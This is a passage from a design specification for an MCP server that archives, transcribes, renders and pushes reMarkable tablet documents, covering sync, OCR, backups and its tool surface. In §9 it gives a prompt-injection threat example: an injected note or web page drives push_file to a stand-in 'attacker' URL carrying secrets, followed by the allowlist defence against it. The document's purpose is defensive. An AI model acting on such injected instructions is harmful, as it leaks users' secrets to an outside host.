**Jobs.** The worker claims with `BEGIN IMMEDIATE; UPDATE jobs SET state='leased', lease_owner=?, lease_expires_at=now+60s, attempts=attempts+1 WHERE id = (SELECT id FROM jobs WHERE state IN ('queued','failed') AND next_run_at<=now ORDER BY priority DESC, created_at, id LIMIT 1) RETURNING *` (M2 adds the priority; before it the order was arrival). `attempts` counts leases, so a job whose worker crashes (lease expires, never reported) still runs out of attempts. Long jobs heartbeat to extend the lease; expired leases are re-queued on worker start and every minute (or marked `dead` when out of attempts). A failed attempt moves the job to `failed` with `next_run_at = now + min(2^attempts × 30 s, 1 h)`, after which it is leasable again; at `max_attempts` it is `dead`, and `*_status(job)` surfaces `dead` with the error (truncated to 1 KB, never content). `dedupe_key` is unique for all time: `enqueue` with an existing key returns that job whatever its state, so keys name the version of the work (`ocr:<acct>:<document>:<page>:<hash>`, `push:<acct>:<uuid>`, `restore:<acct>:<scope-hash>`) and a deliberate re-run uses a new key `<key>:after:<job id>`; a key and its re-runs form a family, capped at three re-runs for all time; a key held by another user is `refused`. Payload and result are capped at 64 KB each. **At most one cloud-writing job is in flight per account** (enforced in `lease` once push/restore jobs exist; M1 has none). M2: at most `OCR_USER_CONCURRENCY` (default 2) `ocr` jobs are leased per user at once, so one user's backlog cannot starve the others. Jobs can be cancelled by their owner while not running, i.e. while `queued` or `failed`. `scriptorium.sqlite` has one `user_version`, so its users/accounts/audit steps and the jobs steps (`db/schema_jobs.py`) are composed into one append-only sequence; they are never migrated independently.

---

## 7. Sync worker

Per linked account, a loop with interval `SCRIPTORIUM_POLL_SECONDS` (default 600), jittered ±10 %: Planned for M2, gated by spike S7: the cloud's change-notification websocket as a *wake-up only*. An event makes the account's loop poll now (with a minimum gap and the usual budgets); polling stays the source of truth because the two-complete-listings rule, the circuit breaker and the generation check all need full listings and a push channel may drop events or close silently; a lost connection falls back to the interval. Enabled by `NOTIFICATIONS=true` (default off; refused at start until S7 has passed); the listener reads only the event name, never the payload's document fields, and a poll is started at most once per `NOTIFY_MIN_GAP_SECONDS` (default 10).

1. **Fetch root** — read the root index (sync 1.5: root hash + generation). Unchanged → sleep. Generation **lower** than the last seen, or a root with zero entries after a non-empty one → set `anomaly`, go read-only (step 7). While an anomaly is set a poll makes no cloud request at all. The anomalous root is still saved as an incomplete listing, so after an administrator clears the anomaly sync resumes from it and still needs two complete listings before any deletion.
2. **Full listing** — fetch every document index. If any fetch fails, process what succeeded for *additions and changes only*, and set `last_full_listing_ok=false`; **no tombstoning on a partial listing.** A listing that ran to its end but failed on some documents therefore suspends tombstoning (confirmed as the rule 2026-10-18 after a live parser gap suspended it for an hour: a parser bug must never be able to cause a tombstone): the poll records `sync_state.tombstoning_suspended_since` (first such poll) and `tombstoning_suspended_failed` (count), the next complete listing clears both, and `account_status` warns `tombstoning_suspended` while they are set. Every wire format is parsed strictly and within bounds (`cloud/protocol.py`: index bodies ≤ 8 MiB, ≤ 50 000 root entries, ≤ 20 000 files per document, blobs ≤ 1 GiB; a malformed line is an error, never skipped; an index must match its address). Root entries that are not UUIDs and file names that fail the allowlist (§11.0) or belong to another document are skipped and counted in the sync report, never archived; a malformed document index fails that document only. The cloud client (`cloud/client.py`) uses its own HTTP client with per-request timeouts and size caps, never follows redirects (a 3xx is refused unread) and refuses any `Content-Encoding` other than identity before reading a body.
3. **Download and commit** — for new or changed documents: download blobs into `staging/`, verify each blob's SHA-256 against the content-addressed name, `fsync`, then atomically rename into `library/` (old files to a per-generation holding area), append `history`, update `documents.hash_root` — all in one SQLite transaction. M2: the same transaction replaces the document's rows in `tags` from its `.content`. Stale staging directories are swept on start.
4. **Tombstones** — a UUID is a deletion candidate only when the listing was complete in **two consecutive polls** and it was absent in both. **Circuit breaker:** if the candidates exceed `max(5, 10 %)` of the library, or more than `TOMBSTONE_MAX_PER_POLL` (50), halt deletes, set `anomaly="mass_delete"`, and surface it in `account_status` and `admin_status`; an admin clears it with `admin_clear_anomaly` after a human has looked. Clearing alone does not resume the deletion: the next poll recomputes the same candidates and trips the breaker again, which is the right outcome when the cloud listing was wrong. When the deletion was genuine, `admin_clear_anomaly(user, reason, allow_mass_delete=true)` writes an approval to `sync_state` bound to the tripped plan: `{"candidates": [...], "root_generation": n, "expires_at": iso}` (built by `cloud/sync.py:mass_delete_approval`). The planner always runs without it first. Only if that plan trips the breaker, the approval has not expired, the root generation is not below `root_generation`, and every tripped candidate is in `candidates` does the planner run again with the breaker skipped (rules 1–4, including the two-complete-listings rule, still apply), so the candidates are tombstoned (moved, never deleted) in one go. Any poll whose planner ran spends the approval, used or not; a rejection is logged with a reason code (`unused`, `malformed`, `expired`, `generation`, `not_covered`) and a count, never UUIDs. A poll stopped before planning leaves it in place. Otherwise move the files to `tombstones/<uuid>/`, set `deleted_at` and `deletion_cause` (`aged` when `last_opened` > 50 days on an account the worker believes is free-tier, else `unknown`; `user` is set only by a documented signal if one exists). A tombstoned UUID that reappears in the cloud is **un-tombstoned** in place. **Tombstones are never purged automatically**; `admin_purge_tombstones(user, older_than_days, dry_run=true)` is the only path, and it requires a confirmation token.
5. **Render** — for pages whose content hash changed, render PNG (§8.3). Failures are logged and retried next cycle; a page that will not parse keeps its last good PNG and is flagged. M2: renders of tombstoned and trashed documents are enqueued at priority −1, and tombstoning deprioritises that document's queued renders, so a large deleted document never delays the pages the user is working on.
6. **Auto-OCR** — if the account's OCR mode is `user` or `server`, enqueue transcription for pages in the `auto_ocr` setting's folders (folder = CollectionType UUID, recursive) whose hash has been **stable for ≥2 polls or 30 min** (debounce while the user is still writing). Caps (§8.1) are checked before each submission; a degraded allowance enqueues nothing and `ocr_status` says why. More than `OCR_BATCH_MIN` (default 10) stable pages at once go through the Message Batches API as one `ocr_batch` job that is polled with backoff; fewer run as single `ocr` jobs. A page whose hash changed before its job ran is skipped, not failed.
7. **Failure classes** — HTTP 429/5xx/network/408: exponential backoff to 1 h, keep polling (`SyncReport.outcome = backoff`). Device token rejected (401/403 from the token endpoint, `token_rejected`) **on three consecutive polls**: mark `needs_relink`, stop polling, surface in `account_status`; the three-poll count and the backoff schedule are the worker loop's, `SyncOnce` only classifies. Each poll runs under a worker-level watchdog and a per-poll byte and time budget (`SyncSettings`), because sizes and durations are otherwise set by what the cloud declares. Unparseable protocol response or a root that fails its hash check: `anomaly="protocol"`; any other non-retryable status on the root pointer or root index (404, 400, a refused redirect) is `backoff` with the error's reason, not an anomaly. Protocol anomaly means read-only safe mode (serve the archive, no downloads, no writes) until an operator clears it or a new release handles it.

Trash: documents whose parent is `trash` stay in the cloud root and are mirrored like any other; `list` hides them unless `include_trash=true`; `trash()` lists both trashed and tombstoned documents; restore recreates parent folders from tombstones when they are missing.

Concurrency: one worker process, an asyncio task per account, bounded by `SYNC_CONCURRENCY` (default 2); within an account, blob downloads use `SYNC_WORKERS` (default 4). Each poll is bounded by `SYNC_MAX_POLL_BYTES` (blob bytes, default 2 GiB; document indexes do not count) and `SYNC_MAX_POLL_SECONDS` (default 1200), both checked before each document index fetch, document commit and blob download: once either is spent the poll starts nothing new, keeps what it committed, leaves the document in progress uncommitted (its fetched blobs stay, content-addressed, so the next poll resumes there), does not save `last_root_hash`, and returns `partial` with reason `byte_budget` or `time_budget`. The budgets are soft: downloads already running finish, so a poll can overshoot by up to `SYNC_WORKERS` blobs. A poll that ends early for any reason (budget, `backoff`, `token_rejected`) applies no tombstones; deletions wait for a poll that runs to the end. The worker treats a budget `partial` as "more to do" and polls again soon rather than waiting the full `POLL_SECONDS`. There is exactly one retry layer — Scriptorium's — and the library's internal retries are disabled. Rendering runs in a process pool (`RENDER_WORKERS`, default 2).

**Writes (push, restore) are worker jobs** and are idempotent: the job fixes the document UUID and blob set at enqueue time; blob uploads are naturally idempotent; the root commit is a single generation-gated **upsert by UUID** — on a generation mismatch the mutation is re-applied to the fresh root; on retry, if the root already holds the UUID with the expected hash, the job is `done`. Root commits send `broadcast: true` so tablets pull promptly.

---

## 8. OCR

### 8.1 Modes

Resolved per user, in this order (a user's own key wins, for privacy and billing):

| Mode | Condition | Who calls Claude | Pays |
| --- | --- | --- | --- |
| `user` | User stored a key with `set_claude_api_key` | Worker, in the background | User |
| `server` | `SCRIPTORIUM_ANTHROPIC_API_KEY` set **and** the user is in `SERVER_KEY_USERS` (default **empty**) or granted by `admin_allow_server_key` | Worker, in the background | Operator |
| `lazy` | Neither | The user's own Claude session: `transcribe` returns the PNG with instructions; the client transcribes and calls `save_transcript` | User's subscription |

When a user links an account and neither key applies, `account_status` and the first `transcribe` call explain the two options.

**Caps.** All spend through the server key is counted against a **global** monthly cap (`OCR_MONTHLY_CAP_USD`) and a **per-user** cap (`OCR_USER_MONTHLY_CAP_USD`), covering auto-OCR *and* on-demand calls; when a cap is reached the mode degrades to `lazy` for the rest of the month and `ocr_status` says so. A user may set their own cap on their own key. Cost is computed from the response's `usage` fields × `OCR_PRICE_IN_PER_MTOK` / `OCR_PRICE_OUT_PER_MTOK` (config, defaults to the current list price of the default model), including thinking tokens.

### 8.2 Transcription contract

- Input: the page PNG (§8.3), the prompt from `src/scriptorium/ocr/prompt.md` (versioned; the version is stored with the transcript). Output: Markdown. The lazy-mode instruction that `read_page` returns with the image is `tools/ocr.py:LAZY_INSTRUCTION`.
- Rules in the prompt: verbatim text, keep structure (headings, lists, `- [ ]` for boxes and arrows, tables where ruled), `[?]` for illegible words, describe sketches in one bracketed line, never summarise.
- Model: `OCR_MODEL` (default `claude-sonnet-5-5`); `max_tokens` `OCR_MAX_TOKENS` (default 4096); extended thinking off, or the lowest effort setting the model accepts; 3 retries with backoff on 429/529.
- Cache key: `(document, page uuid, content_hash)`. Re-transcription only when the hash changes or `transcribe(force=true)`. The request carries the image and the prompt only: no document name, path, tags or user identifier. `ocr/client.py` is the only module that imports the `anthropic` SDK.
- `save_transcript` from lazy mode records `mode=lazy` and the client's stated model; it is accepted only for pages the user owns and only when `content_hash` matches the current page.

### 8.3 Rendering

Paper Pro Move geometry (verified in **S3**, `docs/Spikes/S3.md`): the panel is 954 × 1696 px; `.rm` v6 strokes are in **device-independent units** with x centred on 0 and y from the top, where the Move's screen spans 820 × 1458 units (`SceneInfo.paper_size`), i.e. 954/820 ≈ 1.163 px per unit, the same physical unit as earlier devices (≈ 226 per inch). Ink is **not confined to the paper rectangle**: a scrolled page extends below 1458 and a zoomed-out page extends beyond ±410, so the renderer always draws the union of the paper rectangle and the ink bounding box. Annotated PDFs are different again: the PDF page is laid out at its physical size, **1 pt = 226/72 units**, origin at the page's top centre (a Letter page is 1921 × 2486 units), and the `.rm` for such pages reports the legacy 1404 × 1872 paper size, which must be ignored. Colours: strokes may carry an explicit RGBA (`color_rgba`) that overrides the palette id; highlighters and the shader blend with multiply. Rendering targets:

- Archive PNG (`pages/`): native 1× (1.163 px per unit; 954 × 1696 px for an unscrolled page, taller or wider when the ink extends), which also satisfies the Claude API's 2576 px limit for ordinary pages and costs about 2.2 k image tokens per page; pages whose extent exceeds 2576 px are downscaled for OCR only.
- `page_image(scale)`: `scale ∈ [0.25, 2]` at the tool, snapped to steps of 0.25, so there are eight sizes with a longest side of 256–2048 px (default 1024 px); a free-form scale would let one user mint unbounded cache files and render jobs. When the archive PNG is at least that large the server downscales it (`page_image_bytes`, Lanczos, deterministic) under a two-slot semaphore and caches the result as `pages/<page>/<hash>.<N>px.png` (PNGs are keyed by page UUID and content hash, not by document: documents uploaded from the same files share one PNG and one render job, and a finished render marks every document whose page has that version as rendered); otherwise a worker `page_image` job renders at that scale. `read_page`'s OCR copy (longest side ≤ 2576 px) is cached the same way. The server only ever decodes PNGs the worker wrote, refuses by header any PNG above the renderer's canvas budget, and never renders from `.rm` itself. A missing render is enqueued (dedupe `render:<acct>:<page>:<hash>`); the tool waits `PENDING_WAIT_SECONDS` then answers `pending` with the job id. A dead job whose error is a renderer verdict (`invalid_argument`, `refused`), or whose page version has used its three re-runs, answers `refused`; any other dead job (a crashed or lost render child, a local I/O error) is re-run under a new `:after:<id>` key, at most three times per (account, page, content hash) for all time, and the worker revives such jobs once at start. If a render child dies the worker replaces the broken pool and counts the rebuild (`render_pool_rebuilds`, in the heartbeat file and `account_status.worker`).
- Templates (grids, lines) are not in the document store, so backgrounds render blank; a bundled set of the stock templates may be layered later (MIT-compatible sources only).
- Layers are composited in order; highlighter uses multiply blending; extended-height and zoomed-out pages render at their full extent, the ink bounding box grown by a 20-unit margin before it is unioned with the page rectangle (the S3 goldens depend on that margin). Golden PNGs for the S3 fixture live in `tests/fixtures/move-test-notebook/golden/`.
- Annotated PDFs (`library/render.py`, byte-identical to the S3 reference): a render-pool child opens the archived source blob by path (validated: absolute, canonical, no symlink, a `blobs/<sha256>` regular file, refused above 256 MiB before reading) and cuts the one page out itself (`extract_pdf_page_from_blob`), so PDFium never runs in the worker's main process and only a single-page PDF is rasterised; pypdfium2 rasterises it at 226/72 × 1.163 × scale px per point and the raster is Lanczos-resized to the exact pixel size of the page rectangle; the ink is rasterised by resvg with the viewBox in units; highlighter and shader strokes multiply with the page so PDF text stays readable under them, and all other ink is alpha-composited over it. `render_pdf_page` uses the same geometry without ink, so a page is the same size whether or not it carries annotations. PDFs that do not embed their fonts render with PDFium's built-in substitutes; the image ships no extra fonts, so such text can look different from the tablet (S3 records the measured effect).
- Limits and safety: inputs are untrusted, so `.rm` files over 16 MiB, PDFs over 256 MiB, canvases over 40 Mpx or 32 000 px a side, and unparseable pages are refused with `invalid_argument` before anything is rasterised; v5 `.rm` pages are refused (the Move writes v6). Rendering runs in a spawn-based process pool recycled every 200 tasks; PDFium is serialised per process. Pillow does the compositing and encoding (§4.4).

---

## 9. Push to the tablet

All conversion happens in the worker; clients send text or a URL. This is what makes pushes work from claude.ai mobile.

| Tool | Input | Conversion | Lands as |
| --- | --- | --- | --- |
| `push_markdown(title, folder, markdown)` | Markdown text (≤ `MAX_INLINE_KB`, default 64) | markdown-it (**`html=False`**) → HTML → PDF (WeasyPrint in a sandboxed subprocess) at the device page size | Annotatable PDF |
| `push_file(title, folder, kind, url \| data_base64)` | `pdf`, `epub` | Pass-through | Document |
| `push_ink(title, folder, kind, url \| data_base64)` | `png`, `jpg`, `svg`, `pdf` | `scriptorium-ink` sidecar (rmink, AGPL, optional; §4.4) → `.rm` v6 strokes in a `.rmdoc` (Move geometry) | Native notebook; strokes are erasable and extendable. Hidden when the sidecar is not configured |

**Inline data is small by nature.** A Claude client produces tool arguments as output tokens: S6 measured that claude.ai would not build a 64 KB argument and stalled on a 4 KB literal, and claude.ai cannot hand a chat attachment's bytes to a tool. Realistic inline Markdown is a few KB; `MAX_INLINE_KB` is a server-side ceiling that defaults to 64, and anything larger comes by `url`. In practice "push from a phone" means Markdown or a URL, and the documentation says so.

**Markdown → PDF sandbox.** Raw HTML disabled; WeasyPrint runs with a custom `url_fetcher` that permits only `data:` URIs (no `file:`, no `http(s):`), fonts bundled in the image (DejaVu + Noto Sans CJK; `XDG_CACHE_HOME=/tmp/fontconfig` for the read-only rootfs), in a subprocess with a 30 s CPU limit, 512 MB RSS limit and no network namespace where the runtime permits.

**URL fetches** (`push/fetch.py`): HTTPS only; hostname resolved **once**, every resolved address must satisfy `ipaddress.is_global` (which excludes loopback, RFC 1918, link-local, CGNAT `100.64/10`, IPv4-mapped and ULA), and the connection is pinned to that address; redirects are followed at most 3 times and each hop is re-validated; streamed with a byte cap (`MAX_FETCH_MB`, default 50) and 30 s timeout; content-type checked against `kind`. Because an injected note or web page could drive `push_file(url="https://attacker/?q=<secrets>")`, fetches are additionally gated by `PUSH_URL_ALLOWLIST` (comma-separated host suffixes; when empty, the tool asks for confirmation via a confirmation token that includes the host, §11.0) and the host is written to the audit log. Images pass `PIL.Image.MAX_IMAGE_PIXELS`; PDFs are size- and page-count-checked before pypdfium2 or the sidecar sees them.

Upload path: PDF/EPUB upload is upstream's known-good blob path (`.content`/`.metadata`/`.pagedata`/`.pdf` blobs + document index + generation-gated root commit). Native notebooks use the same mechanism with `.rm` blobs; the unknown is which `.content` fields the Move requires — **S1**. Until S1 passes, `push_ink` is disabled and `push_markdown` always produces PDF. Pushed documents appear on the tablet at its next sync and are then archived by the worker like any other document.

---

## 10. Backup and restore

### 10.1 Backup

- The archive is the backup: xochitl layout, original UUIDs, retained blobs, tombstones instead of deletes.
- Point-in-time snapshots are a **host** responsibility; a container cannot run `zfs`/`btrfs` and should not be privileged. Strategies (`SNAPSHOT_STRATEGY`):
  - `host` — the operator schedules `zfs snapshot` / `btrfs subvolume snapshot` of the `/data` dataset on the Docker host (cron/systemd timer; example scripts in `docker/host-snapshots/`) and mounts the snapshot directory read-only at `/data/snapshots`. Scriptorium only *lists and reads* snapshots by naming convention (`YYYY-MM-DDTHH-MM-SSZ`, the id regex is the allowlist; anything else in the directory is ignored); `admin_snapshot_now` is unavailable. The snapshot directory is a sibling of the data subvolume, never inside it, so snapshots do not nest. Pruning needs root (btrfs subvolume deletion), so the host cron both creates and prunes; the container never writes there. Reading an index from a snapshot: a read-only snapshot taken mid-write carries a non-empty `-wal`, which SQLite's `immutable=1` silently ignores (rows lost); such databases are opened with `mode=ro` on the read-only mount, and `immutable=1` is used only when the `-wal` is absent or empty (S5, `backup/snapshots.py`).
  - `restic` — the worker runs `restic backup` from inside the container to `RESTIC_REPO` (password from a Docker secret, independent of the master key). SQLite files are copied with `VACUUM INTO` first so the backup is consistent. `admin_snapshot_now` triggers a run.
  - `none` — `snapshots()` reports "external".
- Retention (restic): 7 daily, 4 weekly, 6 monthly (configurable). Host strategies keep their own retention.
- **The master key is never under `/data`** and therefore never in a snapshot; a leaked backup exposes no device tokens.

### 10.2 Restore

`restore(scope, from, mode, confirmation_token=null)`:

- `scope`: whole library, a folder UUID, or a list of document UUIDs.
- `from`: `archive` (current view plus tombstones), `snapshot:<id>` (an id from `snapshots()`; never a free-form string), or `version:<uuid>@<generation>`.
- `mode`: `missing` (default: only UUIDs the cloud does not have), `overwrite` (replace cloud copies). `overwrite` and whole-library restores require a confirmation token from a dry run (§11.0).

Algorithm (worker job, resumable): read the cloud root → compute the set → push `CollectionType` records first (parents before children) → push documents in batches, recording per-UUID progress → verify by re-reading the root. Each batch is one generation-gated upsert, so a crash mid-way resumes without duplicates. `restore_status(job)` reports progress. Depends on **S1**.

What restore cannot bring back: device settings, Wi-Fi, templates, splash screens (not in the document store). On the free tier, documents idle > 50 days are only on the tablet and in the archive — the archive is the sole complete copy after a factory reset, which is why §7 never deletes.

---

## 11. MCP tool surface

### 11.0 Conventions (binding for every tool)

- **User context** comes from the bearer token; no tool accepts a user id or a filesystem path. `tools/list` is filtered per request (admin tools, `push_ink`).
- **Document identifiers**: a UUID, or a `/`-separated path of visible names from the root (`Notes/Projects/2026-10`). Ambiguous paths return `ambiguous` with up to 20 candidate UUIDs (identifiers only, never names). Folders likewise. A page number outside the document returns `invalid_argument` with the page count. Cloud-supplied names are display data only; filesystem names are always UUIDs plus one fixed xochitl suffix. The allowlist is `SAFE_NAME_PATTERN` in `library/layout.py`, matched against the whole string with `re.fullmatch` (a `$` anchor would let a trailing newline through): `(?P<doc>[0-9a-f-]{36})(?:\.(?:metadata|content|pagedata|pdf|epub)|/[0-9a-f-]{36}(?:\.rm|-metadata\.json)|\.highlights/[0-9a-f-]{36}\.json|\.thumbnails/[0-9a-f-]{36}\.(?:png|jpg)|\.textconversion/[0-9a-f-]{36}\.json)?`. Any other name in a document index is skipped and counted, never stored (`<uuid>.local`, `.epubindex` and `.cache/` have not been seen in a cloud index; add them here first if they appear). Every resolved path is asserted to stay inside the account root.
- **Pages** are 1-based in every tool.
- **Pagination**: list-like tools take `limit` (≤ 100, default 50) and `cursor`, and return `next_cursor`. Text results are capped at 32 KB (Claude Code persists results of about 64 KB to a file and shows the model a 2 KB preview; S6); `read_document` paginates by page range.
- **Timestamps** are ISO 8601 UTC in and out.
- **Errors** are MCP tool errors (`isError: true`) with `{code, message, hint}`; codes: `not_linked`, `needs_relink`, `not_found`, `ambiguous`, `stale_hash`, `quota_exceeded`, `ocr_cap_reached`, `pending`, `refused`, `confirm_required`, `sync_anomaly`, `invalid_argument`.
- **Long operations** return `{job, state}`; `read_page` on a cache miss waits up to 20 s then returns `pending` with the job id.
- **Destructive actions** (`restore(overwrite)`, `forget_me`, `admin_delete_user`, `admin_purge_tombstones`, `admin_gc_blobs`, `disconnect_remarkable(keep_archive=false)`) are two-step: the first call without a token performs a **dry run** and returns `{confirmation_token, summary}` (valid 10 min, bound to the user and the exact arguments); the second call with the token executes. M2: the token is an HMAC-SHA256 over `(uid, tool, canonical JSON of the arguments, issued_at)` under a key derived from the newest master key (HKDF, info `confirmation`), so it is stateless to issue; executing records its hash in `confirmations` (§6.2), so it runs once. A mismatch is `refused` with a reason (`malformed`, `expired`, `not_bound`, `used`). Tools carry `readOnlyHint` / `destructiveHint` / `idempotentHint` annotations.
- **Files** (`export`, `read_document(format="pdf")`) return a **short-lived signed download URL** `https://mcp.example.com/dl/<token>` (random 256-bit token, 10 min, single user) alongside an MCP resource link, because claude.ai gives the user no way to save a base64 blob. `/dl/*` is the one path that must be reachable from users' browsers (§13).
- **Audit**: every call logs user, tool, duration, outcome and non-content identifiers (§6.2); retention `AUDIT_RETENTION_DAYS` (default 365).

### 11.1 Account

| Tool | Purpose |
| --- | --- |
| `connect_remarkable(code, replace=false)` | Exchange a one-time code from https://my.remarkable.com/device/browser/connect for a device token; store encrypted; start polling. Refuses if that cloud account is linked to another user, or if this user already has an active account and `replace` is false. Each call registers a new device at reMarkable; the tool says so and points at the device list there. The token is sealed only after the link is recorded; with `replace=true` the replaced account is deactivated in the same transaction, its device token is forgotten, and the reply tells the user to remove the old device too. |
| `disconnect_remarkable(keep_archive=true, confirmation_token=null)` | Stop polling and delete the device token locally; the archive stays. Scriptorium cannot revoke it at reMarkable; the response tells the user to remove the device at my.remarkable.com. `keep_archive=false` (M2) is two-step (§11.0): the dry run reports document, page, blob and byte counts; the execute step deactivates the account, forgets the token and **moves** the account directory to `users/<uid>/removed/<acct>-<ts>/`. Nothing is deleted (hard rule); `admin_gc_blobs` remains the only way bytes leave `/data`. |
| `account_status()` | Link state, last successful sync, document/page counts (pages and rendered pages cover non-tombstoned documents, so they track `documents` + `trashed`; tombstoned documents keep their pages and renders uncounted), OCR mode and spend, quota usage, pending jobs, warnings (`needs_relink`, `anomaly`, `render_failures` with a `rerunnable` count, `tombstoning_suspended` with `since` and `failed`, `worker_stale`); `worker.render_pool_rebuilds`. |
| `set_claude_api_key(key, monthly_cap_usd=null)` / `clear_claude_api_key()` | Per-user OCR key (encrypted, `SecretBox` name `claude_api_key`). The key is validated with the cheapest possible API call before it is sealed; the tool records only that a key is present. Clearing forgets the key and keeps transcripts and spend rows. Neither tool, nor any other, ever returns the key or a prefix of it. |
| `set_auto_ocr(folders: [id], enabled)` | Folders to transcribe automatically. |
| `set_sync_scope(mode="all" \| "allow" \| "deny", tags=[])` | M2. Which documents the worker mirrors: everything, only documents or folders carrying one of `tags` (folders apply to their children), or everything except those. Out-of-scope documents are listed as `excluded` and never downloaded; narrowing the scope never deletes what is already archived (open question 5). |
| `create_token(name, ttl_days)` / `revoke_token(id)` / `list_tokens()` | Personal access tokens (§5.4). |
| `forget_me(confirmation_token=null)` | Delete all of the user's data, secrets, jobs, PATs, link-registry rows and audit identifiers. Host snapshots and restic age out by retention (stated in the dry-run summary). The AS account is not touched. |

### 11.2 Library

| Tool | Purpose |
| --- | --- |
| `list(folder=null, include_trash=false, include_deleted=false, account=null, tags=null, cursor, limit)` | Children of a folder (root by default): name, type, uuid, modified, page count, state, and (M2) the document's own tags. M2 `tags`: any-of filter on exact, normalised document tags; with `tags` set the listing is recursive below `folder` (the result says `recursive`), since a tag filter over one level is rarely what the user meant. |
| `recent(since, limit, cursor)` | Documents/pages changed since a timestamp. |
| `search(query, folder=null, tags=null, account=null, limit, cursor)` | FTS over transcripts, names, paths and (M2) the tag names that apply to each transcribed page; `folder` is a subtree by UUID; M2 `tags`: any-of filter on exact, normalised names, where a page hit matches on its own page tags or its document's tags, and a document hit on its document tags; a page hit carries all tags that apply to the page and a document hit the document's own; untranscribed documents match by name or their own tag names; returns page refs with snippets (the "current" flag says whether the hit is the page's present version). Only transcribed pages are in the FTS index, so documents with no transcript are matched by name (case-insensitive substring over `documents`) and returned as document refs after the page hits. Every whitespace-separated term is quoted: FTS5 operators are never interpreted. |
| `read_page(document, page, version=null)` | Transcript when one exists (≤ 30 KB so it fits the 32 KB result cap); otherwise triggers OCR per mode, and in lazy mode returns the image (longest side ≤ 2576 px) with the lazy instruction. |
| `read_document(document, format="markdown" \| "pdf", pages=null)` | Whole document: sectioned Markdown of transcripts (paginated), or a rendered PDF via signed download URL (`format="pdf"` is `invalid_argument` until M3). |
| `page_image(document, page, scale=1)` | PNG of the page for Claude to look at (an image block, which every client delivers to the model), plus a Markdown `/dl/` link with a filename for the person, because claude.ai mobile shows image blocks as text and resource links are invisible on claude.ai, Desktop and mobile (S6). Default size about 200 KB (longest side 1024 px); `scale` snaps to 0.25 steps (§8.3); no `version=` in M1. |
| `versions(document, cursor, limit)` / `read_page(document, page, version=<generation>)` | Version history (§6), newest first, paginated. |
| `link_page(document, page, kind, ref)` / `links(document, page)` | Store or list external references (opaque strings ≤ 1 KB). |

### 11.3 OCR

| Tool | Purpose |
| --- | --- |
| `transcribe(document, pages=[], force=false)` | Enqueue OCR (user/server mode) or return images (lazy mode). |
| `save_transcript(document, page, content_hash, text, model)` | Lazy-mode write-back; `stale_hash` unless `content_hash` is the page's current hash; text ≤ 30 KB, printable model name; transcripts are per document, so a copy sharing page UUIDs keeps its own. |
| `ocr_status()` | Queue depth, last errors, spend this month against each applicable cap. |

### 11.4 Push

`push_markdown`, `push_file`, `push_ink` as in §9; `push_status(job)`.

### 11.5 Backup and restore

| Tool | Purpose |
| --- | --- |
| `snapshots()` | Available snapshots (ids, dates, sizes) or "external". |
| `trash(limit, cursor)` | Trashed and tombstoned documents with `deletion_cause`. |
| `restore(scope, from, mode, confirmation_token=null)` / `restore_status(job)` | §10.2. |
| `export(document, format="rmdoc" \| "pdf", version=null)` | Signed download URL for a `.rmdoc` or PDF. |

### 11.6 Admin (role-gated; never via PAT)

| Tool | Purpose |
| --- | --- |
| `admin_status()` | Versions, uptime, worker heartbeat, disk usage, cloud error rates, anomalies, snapshot strategy state, licence-check result. |
| `admin_users()` | Users, link state (including which user holds a given reMarkable account), storage used, last sync, OCR mode (never keys). |
| `admin_set_quota(user, gb)` / `admin_disable_user(user)` / `admin_delete_user(user, confirmation_token=null)` | Operator controls. Disabling revokes PATs and stops polling. |
| `admin_allow_server_key(user, allowed)` | Grant/revoke use of the server-wide Claude key. `user` is the 16-character uid (as in `account_status` and the audit log), never an email. |
| `admin_transfer_link(from_user, to_user)` | Move a reMarkable link and its archive when a user loses their AS identity. |
| `admin_clear_anomaly(user, reason, allow_mass_delete=false)` | Resume deletes/sync after a mass-delete or protocol anomaly, after a human check. `allow_mass_delete=true` additionally lets the next poll apply the pending mass deletion once (§7 step 4); without it a genuine bulk delete trips the breaker again. |
| `admin_purge_tombstones(user, older_than_days, confirmation_token=null)` / `admin_gc_blobs(user, confirmation_token=null)` | The only ways data leaves `/data`. Dry run first. |
| `admin_snapshot_now()` | restic strategy only. |
| `admin_audit(user=null, since, limit, cursor)` | Audit log. |

Server-wide settings are environment only (§12); there is intentionally no tool that mutates them.

---

## 12. Configuration

Environment variables, all prefixed `SCRIPTORIUM_`. Secrets may be given as `*_FILE` paths for Docker secrets.

| Variable | Default | Notes |
| --- | --- | --- |
| `PUBLIC_URL` | — | `https://mcp.example.com/mcp`, byte-exact; used as OAuth `resource` and default audience |
| `BIND` | `0.0.0.0:8000` | MCP + well-known + `/dl`; behind the reverse proxy only |
| `TRUSTED_PROXIES` | Docker bridge ranges | Addresses whose `X-Forwarded-For`/`-Proto` are believed (needed for rate limits and `/dl` logging when the proxy is on another machine) |
| `METRICS_BIND` | `0.0.0.0:9100` | Prometheus; **not** published through the proxy |
| `DATA_DIR` | `/data` | Must be a local POSIX filesystem |
| `MASTER_KEYS` | — | One or more urlsafe-base64 32-byte keys, comma-separated, newest first (MultiFernet; rotate by prepending and re-encrypting with `scriptorium admin rotate-keys`). Generate with `scriptorium gen-master-key`. Keep an escrow copy outside `/data`. Losing every key means every user relinks. |
| `OIDC_*` | — | §5.2; `OIDC_ALLOWED_USERS` required |
| `OIDC_REQUIRED_SCOPES` | empty | Scopes (from `scope` or `scp`) a token must carry; empty = `aud` alone decides (§5.1) |
| `OIDC_JWKS_MAX_AGE_SECONDS` | `3600` | Cached JWKS is refreshed after this age; 60–86400 (§5.1) |
| `OIDC_UNSAFE_USER_CLAIM` | `false` | Required to use an `OIDC_USER_CLAIM` other than `sub` (§5.2) |
| `SPIKE_TOOLS` | `false` | Registers the `spike_*` test tools used by S6; never on in production |
| `ALLOW_ALL_ISSUER_USERS` | `false` | Explicit opt-out of the allowlist |
| `POLL_SECONDS` | `600` | 30–86400, jittered ±10 % |
| `SYNC_CONCURRENCY` / `SYNC_WORKERS` / `RENDER_WORKERS` | `2` / `4` / `2` | |
| `SYNC_MAX_POLL_BYTES` | `2147483648` | Blob bytes one poll may download (2 GiB); > 0 (§7) |
| `SYNC_MAX_POLL_SECONDS` | `1200` | How long one poll may keep starting work; 10–86400 (§7) |
| `POLL_TIMEOUT_SECONDS` | `1800` | Watchdog: past this the worker closes the account's cloud client and backs off; 60–86400 and must exceed `SYNC_MAX_POLL_SECONDS` (checked at start) |
| `PENDING_WAIT_SECONDS` | `20` | How long `read_page`/`page_image` wait for a render before answering `pending`; 0–60 |
| `TOMBSTONE_MAX_PER_POLL` | `50` | Circuit breaker (§7) |
